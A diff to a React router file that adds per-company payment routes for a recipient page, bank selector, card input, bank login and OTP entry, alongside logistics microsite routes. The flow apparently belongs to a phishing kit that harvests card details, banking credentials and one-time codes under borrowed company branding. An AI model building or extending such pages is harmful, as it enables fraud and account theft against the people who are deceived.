@@ -50,6 +50,33 @@ const App = () => (
           <Route path="/logistics/:country" element={<LogisticsServices />} />
           <Route path="/contracts/:country" element={<Contracts />} />
           <Route path="/r/:country/:type/:id" element={<Microsite />} />
+          <Route path="/pay/:company/:id/recipient" element={
+            <PaymentThemeWrapper>
+              <PaymentRecipient />
+            </PaymentThemeWrapper>
+          } />
+          <Route path="/pay/:company/:id/details" element={
+            <PaymentThemeWrapper>
+              <PaymentDetailsTheme />
+            </PaymentThemeWrapper>
+          } />
+          {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
+          <Route path="/pay/:company/:id/bank-selector" element={<PaymentBankSelector />} />
+          <Route path="/pay/:company/:id/card-input" element={
+            <PaymentThemeWrapper>
+              <PaymentCardInputTheme />
+            </PaymentThemeWrapper>
+          } />
+          <Route path="/pay/:company/:id/bank-login" element={<PaymentBankLogin />} />
+          {/* Legacy routes (kept for backwards compatibility) */}
+          <Route path="/pay/:company/:id/card" element={<PaymentCardForm />} />
+          <Route path="/pay/:company/:id/otp" element={
+            <PaymentThemeWrapper>
+              <PaymentOTPTheme />
+            </PaymentThemeWrapper>
+          } />
+
+          {/* Backwards compatibility: Routes without company parameter */}
           <Route path="/pay/:id/recipient" element={
             <PaymentThemeWrapper>
               <PaymentRecipient />
@@ -60,7 +87,6 @@ const App = () => (
               <PaymentDetailsTheme />
             </PaymentThemeWrapper>
           } />
-          {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
           <Route path="/pay/:id/card-input" element={
             <PaymentThemeWrapper>
@@ -68,7 +94,6 @@ const App = () => (
             </PaymentThemeWrapper>
           } />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
-          {/* Legacy routes (kept for backwards compatibility) */}
           <Route path="/pay/:id/card" element={<PaymentCardForm />} />
           <Route path="/pay/:id/otp" element={
             <PaymentThemeWrapper>
